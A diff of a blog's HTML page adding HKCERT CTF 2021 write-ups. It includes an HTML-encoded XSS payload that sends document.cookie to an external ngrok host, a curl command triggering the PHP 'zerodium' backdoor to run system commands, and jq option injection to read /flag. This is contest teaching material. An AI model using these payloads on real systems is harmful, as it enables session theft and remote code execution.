@@ -16,7 +16,7 @@
 <meta name=application-name content="Ja5on's blog">
 <meta name=apple-mobile-web-app-title content="Ja5on's blog"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico>
 <link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png>
-<link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=canonical href=http://CUHKJason.github.io/posts/hkcertctf-2021/><link rel=prev href=http://CUHKJason.github.io/posts/allesctf-2021/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"HKCERTCTF 2021 Writeup","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http:\/\/CUHKJason.github.io\/posts\/hkcertctf-2021\/"},"genre":"posts","keywords":"ctf, writeup, web, misc, pwn, reverse, crypto","wordcount":1909,"url":"http:\/\/CUHKJason.github.io\/posts\/hkcertctf-2021\/","datePublished":"2021-11-15T17:00:10+08:00","dateModified":"2021-11-15T17:00:10+08:00","publisher":{"@type":"Organization","name":"Ja5on"},"author":{"@type":"Person","name":"Ja5on"},"description":""}</script></head>
+<link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=canonical href=http://CUHKJason.github.io/posts/hkcertctf-2021/><link rel=prev href=http://CUHKJason.github.io/posts/allesctf-2021/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"HKCERTCTF 2021 Writeup","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http:\/\/CUHKJason.github.io\/posts\/hkcertctf-2021\/"},"genre":"posts","keywords":"ctf, writeup, web, misc, pwn, reverse, crypto","wordcount":2723,"url":"http:\/\/CUHKJason.github.io\/posts\/hkcertctf-2021\/","datePublished":"2021-11-15T17:00:10+08:00","dateModified":"2021-11-15T17:00:10+08:00","publisher":{"@type":"Organization","name":"Ja5on"},"author":{"@type":"Person","name":"Ja5on"},"description":""}</script></head>
 <body header-desktop header-mobile><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'dark'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'dark'==='dark')&&document.body.setAttribute('theme','dark')</script>
 <div id=mask></div><div class=wrapper><header class=desktop id=header-desktop>
 <div class=header-wrapper>
@@ -57,8 +57,8 @@
 <div class=toc-content id=toc-content-auto></div>
 </div><article class="page single"><h1 class="single-title animated flipInX">HKCERTCTF 2021 Writeup</h1><div class=post-meta>
 <div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>Ja5on</a></span>&nbsp;<span class=post-category>included in <a href=/categories/ctf/><i class="far fa-folder fa-fw"></i>ctf</a></span></div>
-<div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2021-11-15>2021-11-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1909 words&nbsp;
-<i class="far fa-clock fa-fw"></i>&nbsp;9 minutes&nbsp;</div>
+<div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2021-11-15>2021-11-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2723 words&nbsp;
+<i class="far fa-clock fa-fw"></i>&nbsp;13 minutes&nbsp;</div>
 </div><div class="details toc" id=toc-static kept>
 <div class="details-summary toc-title">
 <span>Contents</span>
@@ -92,6 +92,31 @@
 <li><a href=#challenge--3>Challenge :</a></li>
 <li><a href=#files--3>Files :</a></li>
 <li><a href=#solution--3>Solution :</a></li>
+</ul>
+</li>
+<li><a href=#純孩兒-babyxss---web-100-points>純孩兒 (babyXSS) - Web (100 points)</a>
+<ul>
+<li><a href=#challenge--4>Challenge :</a></li>
+<li><a href=#solution--4>Solution :</a></li>
+</ul>
+</li>
+<li><a href=#荊棘海-the-wilderness---web-100-points>荊棘海 (The Wilderness) - Web (100 points)</a>
+<ul>
+<li><a href=#challenge--5>Challenge :</a></li>
+<li><a href=#files--4>Files :</a></li>
+<li><a href=#solution--5>Solution :</a></li>
+</ul>
+</li>
+<li><a href=#樂園-jq-playground---web-200-points>樂園 (JQ Playground) - Web (200 points)</a>
+<ul>
+<li><a href=#challenge--6>Challenge :</a></li>
+<li><a href=#solution--6>Solution :</a></li>
+</ul>
+</li>
+<li><a href=#回到12歲-scratch-tic-tac-toe---misc-200-points>回到12歲 (scratch-tic-tac-toe) - Misc (200 points)</a>
+<ul>
+<li><a href=#challenge--7>Challenge :</a></li>
+<li><a href=#solution--7>Solution :</a></li>
 </ul>
 </li>
 </ul>
@@ -634,7 +659,229 @@ r.interactive()
 </div><p>FLAG : <strong>hkcert21{4lw4ys_l0ok_4t_s74ck_0verf1ow_wh3n_y0u_w4nt_t0_4v01d_s7ack_0v3rfl0ws}</strong></p>
 <p>P.S. I sent this meme to the author after solved this challenge :)
 <img class=lazyload src=/svg/loading.min.svg data-src=https://user-images.githubusercontent.com/19466939/141827583-69430cb6-5f2e-425d-8699-74d7f9c892a4.png data-srcset="https://user-images.githubusercontent.com/19466939/141827583-69430cb6-5f2e-425d-8699-74d7f9c892a4.png, https://user-images.githubusercontent.com/19466939/141827583-69430cb6-5f2e-425d-8699-74d7f9c892a4.png 1.5x, https://user-images.githubusercontent.com/19466939/141827583-69430cb6-5f2e-425d-8699-74d7f9c892a4.png 2x" data-sizes=auto alt=https://user-images.githubusercontent.com/19466939/141827583-69430cb6-5f2e-425d-8699-74d7f9c892a4.png title=haha></p>
-<p>&mldr;To be updated&mldr;</p>
+<h2 id=純孩兒-babyxss---web-100-points>純孩兒 (babyXSS) - Web (100 points)</h2>
+<h3 id=challenge--4>Challenge :</h3>
+<blockquote>
+<p>Have you tried the infant xss challenge in the training platform? If you did, then you can try out this BABY XSS CHALLENGE&mldr;<br>
+<a href=http://babyxss-m7neh9.hkcert21.pwnable.hk target=_blank rel="noopener noreffer">http://babyxss-m7neh9.hkcert21.pwnable.hk</a><br>
+XSS Bot: <a href=http://xssbot-cxild5.hkcert21.pwnable.hk target=_blank rel="noopener noreffer">http://xssbot-cxild5.hkcert21.pwnable.hk</a></p>
+</blockquote>
+<h3 id=solution--4>Solution :</h3>
+<p>Checking the source code of the webpage, we can obtain some obfuscated javascript.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>TOUPPERCASE = &#34;\164\157\125\160\160\145\162\103\141\163\145&#34;;
+SUBSTR = &#34;\163\165\142\163\164\162&#34;;
+ENCODEURI = &#34;\145\156\143\157\144\145\125\122\111&#34;;
+DECODEURI = &#34;\144\145\143\157\144\145\125\122\111&#34;;
+VALUE = &#34;\166\141\154\165\145&#34;;
+SRCDOC = &#34;\163\162\143\144\157\143&#34;;
+CONTENTWINDOW = &#34;\143\157\156\164\145\156\164\127\151\156\144\157\167&#34;;
+PARENT = &#34;\160\141\162\145\156\164&#34;;
+LOCATION = &#34;\154\157\143\141\164\151\157\156&#34;;
+HASH = &#34;\150\141\163\150&#34;;
+WINDOW = OUTPUT[CONTENTWINDOW][PARENT];
+
+CONVERT = () =&gt; {
+    INPUT[VALUE] = WINDOW[DECODEURI](WINDOW[LOCATION][HASH][SUBSTR](1));
+    OUTPUT[SRCDOC] = INPUT[VALUE][TOUPPERCASE]();
+</code></pre></td></tr></table>
+</div>
+</div><p>Tried to deobfuscate the code using <a href=https://deobfuscate.io/ target=_blank rel="noopener noreffer">https://deobfuscate.io/</a>, we can get:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>TOUPPERCASE = &#34;toUpperCase&#34;;
+SUBSTR = &#34;substr&#34;;
+ENCODEURI = &#34;encodeURI&#34;;
+DECODEURI = &#34;decodeURI&#34;;
+VALUE = &#34;value&#34;;
+SRCDOC = &#34;srcdoc&#34;;
+CONTENTWINDOW = &#34;contentWindow&#34;;
+PARENT = &#34;parent&#34;;
+LOCATION = &#34;location&#34;;
+HASH = &#34;hash&#34;;
+WINDOW = OUTPUT[CONTENTWINDOW][PARENT];
+</code></pre></td></tr></table>
+</div>
+</div><p>Next let&rsquo;s rewrite the <code>CONVERT</code> function:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>CONVERT = () =&gt; {
+    INPUT[VALUE] = decodeURI(location.hash.substr(1));
+    OUTPUT[SRCDOC] = INPUT.value.toUpperCase();
+</code></pre></td></tr></table>
+</div>
+</div><p>From the <code>CONVERT</code> function, we know that it will take the input from the URL after <code>#</code> and convert to uppercase, i.e. for <code>http://babyxss-m7neh9.hkcert21.pwnable.hk/#%3Cscript%3Ealert('XSS')%3C/script%3E</code>, it will be converted to <code>&lt;SCRIPT>ALERT('XSS')&lt;/SCRIPT></code> which is not a valid javascript as shown below:
+[pic]
+Therefore we need to find some function that is also defined in uppercase.
+We can use html encoding to bypass the <code>toUpperCase</code>.</p>
+<p><strong>Solve:</strong></p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>http://babyxss-m7neh9.hkcert21.pwnable.hk/#%3Cimg%20src=x%20onerror=%22&amp;#x6C;&amp;#x6F;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6F;&amp;#x6E;&amp;#x2E;&amp;#x68;&amp;#x72;&amp;#x65;&amp;#x66;&amp;#x3D;&amp;#x27;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3A;&amp;#x2F;&amp;#x2F;&amp;#x33;&amp;#x61;&amp;#x63;&amp;#x63;&amp;#x2D;&amp;#x31;&amp;#x38;&amp;#x33;&amp;#x2D;&amp;#x31;&amp;#x37;&amp;#x39;&amp;#x2D;&amp;#x37;&amp;#x32;&amp;#x2D;&amp;#x32;&amp;#x33;&amp;#x30;&amp;#x2E;&amp;#x6E;&amp;#x67;&amp;#x72;&amp;#x6F;&amp;#x6B;&amp;#x2E;&amp;#x69;&amp;#x6F;&amp;#x2F;&amp;#x3F;&amp;#x66;&amp;#x6C;&amp;#x61;&amp;#x67;&amp;#x3D;&amp;#x27;&amp;#x2B;&amp;#x65;&amp;#x6E;&amp;#x63;&amp;#x6F;&amp;#x64;&amp;#x65;&amp;#x55;&amp;#x52;&amp;#x49;&amp;#x43;&amp;#x6F;&amp;#x6D;&amp;#x70;&amp;#x6F;&amp;#x6E;&amp;#x65;&amp;#x6E;&amp;#x74;&amp;#x28;&amp;#x64;&amp;#x6F;&amp;#x63;&amp;#x75;&amp;#x6D;&amp;#x65;&amp;#x6E;&amp;#x74;&amp;#x2E;&amp;#x63;&amp;#x6F;&amp;#x6F;&amp;#x6B;&amp;#x69;&amp;#x65;&amp;#x29;%22%3E%3C/img%3E
+</code></pre></td></tr></table>
+</div>
+</div><p>FLAG : <strong>hkcert21{zOMG_MY_KEYBOARD_IS_BROKEN_CANNOT_TURN_OFF_CAPSLOCK111111111}</strong></p>
+<h2 id=荊棘海-the-wilderness---web-100-points>荊棘海 (The Wilderness) - Web (100 points)</h2>
+<h3 id=challenge--5>Challenge :</h3>
+<blockquote>
+<blockquote>
+<p>就在回望一刻總有哀 世界已不再 誰偏偏一再 等待 到終於不記得等待</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<p>Mystiz likes PHP most. He has been programming in PHP at the time PHP 5 was released. Time flies and here comes PHP 8. He decided to craft a Docker image as a sandbox&mldr; What can go wrong?<br>
+<a href=http://chalp.hkcert21.pwnable.hk:28364/ target=_blank rel="noopener noreffer">http://chalp.hkcert21.pwnable.hk:28364/</a></p>
+</blockquote>
+<h3 id=files--4>Files :</h3>
+<p><a href=/files/HKCERT/sea-of-thorns_e045a87b1909724e7292510354cc1f3b.zip rel>sea-of-thorns_e045a87b1909724e7292510354cc1f3b.zip</a></p>
+<h3 id=solution--5>Solution :</h3>
+<p>From the <code>index.php</code> we know that the flag is in the comment block of the source code, but there is no other useful stuff inside&mldr;so let&rsquo;s have a look at the Docker file.<br>
+From the <code>Dockerfile</code>, it is weird that the PHP is installed by downloading a specific version of PHP from Github (<code>wget https://github.com/php/php-src/archive/c730aa26bd52829a49f2ad284b181b7e82a68d7d.zip</code>). By Googling the hash we can find that it is the affected version of the hacked PHP, which the PHP Git server was hacked and a RCE backdoor was injected into the source code. Therefore we can exploit the RCE to get the content of the <code>index.php</code>, i.e. the flag by adding the HTTP header <code>User-Agentt</code> with the command prepending the magic word <code>zerodium</code>.</p>
+<p><strong>Solve:</strong><br>
+<code>curl http://chalp.hkcert21.pwnable.hk:28364/ -H "User-Agentt: zerodiumsystem('cat index.php');"</code></p>
+<p>FLAG : <strong>hkcert21{vu1n3r1b1li7ie5_m1gh7_c0m3_fr0m_7h3_5upp1y_ch41n}</strong></p>
+<h2 id=樂園-jq-playground---web-200-points>樂園 (JQ Playground) - Web (200 points)</h2>
+<h3 id=challenge--6>Challenge :</h3>
+<blockquote>
+<p>I wrote a simple testbed for the JSON processor jq!<br>
+The flag is written in the file /flag.<br>
+<a href=http://chalp.hkcert21.pwnable.hk:28370/ target=_blank rel="noopener noreffer">http://chalp.hkcert21.pwnable.hk:28370/</a></p>
+</blockquote>
+<h3 id=solution--6>Solution :</h3>
+<p>At the bottom of the webpage, we can see the button <a href=http://chalp.hkcert21.pwnable.hk:28370/?-s target=_blank rel="noopener noreffer"><code>View Source</code></a> and get the key source code:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>&lt;?php
+if (isset($_GET[&#34;-s&#34;])) {
+    highlight_file(__FILE__);
+    exit();
+}
+if (!empty($_POST)) {
+  if (empty($_POST[&#39;filter&#39;]) || empty($_POST[&#39;json&#39;])) {
+    die(&#34;Filter or JSON is empty&#34;);
+  }
+
+  $filter = escapeshellarg($_POST[&#39;filter&#39;]);
+  $json = escapeshellarg($_POST[&#39;json&#39;]);
+  
+  $options = &#34;&#34;;
+
+  if (!empty($_POST[&#39;options&#39;]) &amp;&amp; is_array($_POST[&#39;options&#39;])) {
+    foreach ($_POST[&#39;options&#39;] as $o) {
+      $options .= escapeshellarg($o) . &#39; &#39;;
+    }
+  }
+
+  $command = &#34;jq $options $filter&#34;;
+  passthru(&#34;echo $json | $command&#34;);
+
+  die();
+}
+</code></pre></td></tr></table>
+</div>
+</div><p>We can see that we are providing parameters and input to call the <code>jq</code> and our goal is to get the file <code>/flag</code>. With some <a href=https://www.jianshu.com/p/e05a5940f833 target=_blank rel="noopener noreffer">Googling</a> I found that we can use <code>--rawfile</code> to get the file content. With some trials to crafting the payload, we can get the flag by reflecting the content out with the command <code>echo {"data":{"update":null}}' | jq --rawfile a /flag '.data.update = $a'</code>.</p>
+<p><strong>Solve:</strong><br>
+<code>curl -X POST 'http://chalp.hkcert21.pwnable.hk:28370/' -F 'filter=.data.update=$a' -F 'json={"data":{"update":null}}' -F 'options[]=--rawfile' -F 'options[]=a' -F 'options[]=/flag'</code></p>
+<p>FLAG : <strong>hkcert21{y0u\are\n0w\jq\expert!}</strong></p>
+<h2 id=回到12歲-scratch-tic-tac-toe---misc-200-points>回到12歲 (scratch-tic-tac-toe) - Misc (200 points)</h2>
+<h3 id=challenge--7>Challenge :</h3>
+<blockquote>
+<p>If you can beat me in the game I&rsquo;ll give you the flag!<br>
+<a href=https://scratch.mit.edu/projects/596813541/ target=_blank rel="noopener noreffer">https://scratch.mit.edu/projects/596813541/</a></p>
+</blockquote>
+<h3 id=solution--7>Solution :</h3>
+<p>This is a Tic-Tac-Toe game written in Scratch. It did bring me back to my F.4 life which I learnt about Scratch in my ICT lesson.<br>
+We can click the <code>See inside</code> button to view the source code of this project. By selecting the <code>Title</code>, we can see a yellow notes and if you remove it, you can see the key logic of getting the flag.
+[pic1]
+[pic2]
+We can see that if we input the correct flag, the program will perform some process and check if it is equal to <code>03vx{_ihq0xhh7svtx}t{sv180x{r</code>. Therefore, by reversing the logic, we can get the flag.</p>
+<p><strong>Solve:</strong></p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>charset = &#34;abcdefghijklmnopqrstuvwxyz0123456789{}_&#34;
+cipher = &#34;03vx{_ihq0xhh7svtx}t{sv180x{r&#34;
+flag = &#34;&#34;
+for i in range(len(cipher)):
+    flag = flag + charset[charset.find(cipher[i]) - 19 % len(charset)]
+print(flag)
+</code></pre></td></tr></table>
+</div>
+</div><p>FLAG : <strong>hkcert21{he11o_caesar_cipher}</strong></p>
 </div><div class=post-footer id=post-footer>
 <div class=post-info>
 <div class=post-info-line>
@@ -660,7 +907,7 @@ r.interactive()
 </div>
 </article></div>
 </main><footer class=footer>
-<div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.89.2">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+<div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.89.4">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
 </div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2021</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>Ja5on</a></span></div>
 </div>
 </footer></div>
